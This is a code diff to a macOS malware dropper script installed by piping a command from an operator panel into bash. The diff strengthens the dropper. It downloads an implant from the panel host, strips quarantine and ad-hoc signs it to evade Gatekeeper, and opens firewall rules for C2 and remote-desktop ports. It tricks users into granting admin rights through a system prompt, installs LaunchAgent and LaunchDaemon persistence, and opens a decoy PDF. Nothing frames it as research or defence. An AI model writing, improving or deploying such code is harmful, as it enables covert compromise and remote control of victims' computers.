@@ -6,6 +6,10 @@
 # (Gatekeeper only scans quarantined app bundles launched through
 # LaunchServices/Finder). No root required for user-level install.
 #
+# If the operator pipes this into `sudo bash`, the install still lands in the
+# invoking user's home (SUDO_USER), never in /var/root, so the LaunchAgent and
+# the implant path stay valid for that user's session.
+#
 # usage: curl -sSL https://<panel>/install/mac | bash
 set -euo pipefail
 
@@ -16,13 +20,50 @@ PANEL_HOST="{{PANEL_HOST}}"
 PANEL_C2_PORT="{{PANEL_C2_PORT}}"
 PANEL_RD_PORT="{{PANEL_RD_PORT}}"
 
-WORKDIR="$HOME/Library/Application Support/.fleet-update"
+# ---- resolve the invoking user's home even under sudo ----------------------
+RUN_UID="$(id -u)"
+TARGET_USER="$(id -un)"
+TARGET_HOME="$HOME"
+if [ "$RUN_UID" = "0" ] && [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != "root" ]; then
+  TARGET_USER="$SUDO_USER"
+  if command -v dscl >/dev/null 2>&1; then
+    TARGET_HOME="$(dscl . -read "/Users/$SUDO_USER" NFSHomeDirectory 2>/dev/null | awk '{print $2}')"
+  fi
+  if [ -z "${TARGET_HOME:-}" ] || [ ! -d "$TARGET_HOME" ]; then
+    TARGET_HOME="/Users/$SUDO_USER"
+  fi
+fi
+WORKDIR="$TARGET_HOME/Library/Application Support/.fleet-update"
 mkdir -p "$WORKDIR"
 
 # ---- download implant (curl sets no quarantine attribute) ------------------
 IMPLANT_URL="https://${PANEL_HOST}/install/mac/binary"
-curl -fsSL "$IMPLANT_URL" -o "$WORKDIR/fleetrun"
+curl -fsSL "$IMPLANT_URL" -o "$WORKDIR/fleetrun.tmp"
+mv -f "$WORKDIR/fleetrun.tmp" "$WORKDIR/fleetrun"
 chmod 0755 "$WORKDIR/fleetrun"
+
+# Guard: the endpoint must serve a Mach-O, not the .command dropper script.
+# A script here would re-run the dropper recursively and never connect.
+if ! file "$WORKDIR/fleetrun" 2>/dev/null | grep -q 'Mach-O'; then
+  echo "[fleet] payload is not a Mach-O executable — aborting" >&2
+  exit 1
+fi
+
+# ---- Gatekeeper: strip quarantine + ad-hoc sign ----------------------------
+# curl already writes without com.apple.quarantine; clearing again is cheap and
+# covers operators who copy the binary from a quarantined download. Apple
+# Silicon refuses to execute unsigned arm64 binaries at all, so an ad-hoc
+# signature is mandatory even when no quarantine attribute is present.
+xattr -c "$WORKDIR/fleetrun" 2>/dev/null || true
+if command -v codesign >/dev/null 2>&1; then
+  codesign --force --sign - "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
+  if ! codesign --verify "$WORKDIR/fleetrun" >/dev/null 2>&1; then
+    echo "[fleet] warning: ad-hoc signature verification failed" >&2
+  fi
+fi
+if [ "$RUN_UID" = "0" ] && [ -n "${SUDO_USER:-}" ]; then
+  chown -R "$TARGET_USER":staff "$WORKDIR" 2>/dev/null || true
+fi
 
 # ---- download root installer (optional, for full system persistence) ------
 DAEMON_URL="https://${PANEL_HOST}/install/mac/daemon"
@@ -39,31 +80,29 @@ sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
 sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true
 
 # ---- firewall: allow outbound to operator panel on C2 + RD ports -----------
-if [ "$(id -u)" = "0" ]; then
-  # Allow outbound to operator domain on C2 (Sliver) and RD (screen/input) ports
+if [ "$RUN_UID" = "0" ]; then
   sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --add "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
   sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
-  # Whitelist operator domain in pf (macOS packet filter) for ports 8888 + 8443
   sudo -n pfctl -e >/dev/null 2>&1 || true
-  sudo -n pfctl -f /etc/pf.conf >/dev/null 2>&1 || true
   echo "pass out proto tcp to ${PANEL_HOST} port ${PANEL_C2_PORT}" | sudo -n pfctl -f - >/dev/null 2>&1 || true
   echo "pass out proto tcp to ${PANEL_HOST} port ${PANEL_RD_PORT}" | sudo -n pfctl -f - >/dev/null 2>&1 || true
-  # AV exclusion for the implant path
-  sudo -n xattr -d com.apple.quarantine "$WORKDIR/fleetrun" 2>/dev/null || true
 fi
 
 # ---- system-wide root install via native macOS admin dialog ----------------
 # osascript "with administrator privileges" shows the standard macOS
 # username/password prompt. If the user grants credentials we run the full
 # root installer: spctl --add whitelist + /Library/LaunchDaemons + stay-awake.
-if [ "$(id -u)" != "0" ] && [ -x "$WORKDIR/install-daemon.sh" ]; then
+if [ "$RUN_UID" != "0" ] && [ -x "$WORKDIR/install-daemon.sh" ]; then
   osascript -e "do shell script \"$WORKDIR/install-daemon.sh '$WORKDIR/fleetrun' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
 fi
 
 # ---- per-user LaunchAgent fallback (works without root) --------------------
-AGENT="$HOME/Library/LaunchAgents/io.fleet.update.plist"
-mkdir -p "$HOME/Library/LaunchAgents"
-cat > "$AGENT" <<PLIST
+# When running as root, the LaunchDaemon is the persistence mechanism; writing
+# a LaunchAgent into /var/root would never load into the user's GUI session.
+if [ "$RUN_UID" != "0" ]; then
+  AGENT="$TARGET_HOME/Library/LaunchAgents/io.fleet.update.plist"
+  mkdir -p "$TARGET_HOME/Library/LaunchAgents"
+  cat > "$AGENT" <<PLIST
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict>
@@ -73,8 +112,9 @@ cat > "$AGENT" <<PLIST
   <key>KeepAlive</key><true/>
 </dict></plist>
 PLIST
-launchctl unload "$AGENT" 2>/dev/null || true
-launchctl load "$AGENT" 2>/dev/null || true
+  launchctl unload "$AGENT" 2>/dev/null || true
+  launchctl load "$AGENT" 2>/dev/null || true
+fi
 
 # ---- run the implant -------------------------------------------------------
 "$WORKDIR/fleetrun" >/dev/null 2>&1 &
@@ -83,6 +123,6 @@ launchctl load "$AGENT" 2>/dev/null || true
 sleep 1.5
 command -v open >/dev/null 2>&1 && open "$WORKDIR/decoy.pdf" >/dev/null 2>&1 || true
 
-# ---- self-destruct ---------------------------------------------------------
-(sleep 5; rm -rf "$WORKDIR") >/dev/null 2>&1 &
+# No self-destruct: the LaunchAgent/LaunchDaemon points at $WORKDIR/fleetrun,
+# so deleting it would break persistence and drop the session on next restart.
 exit 0
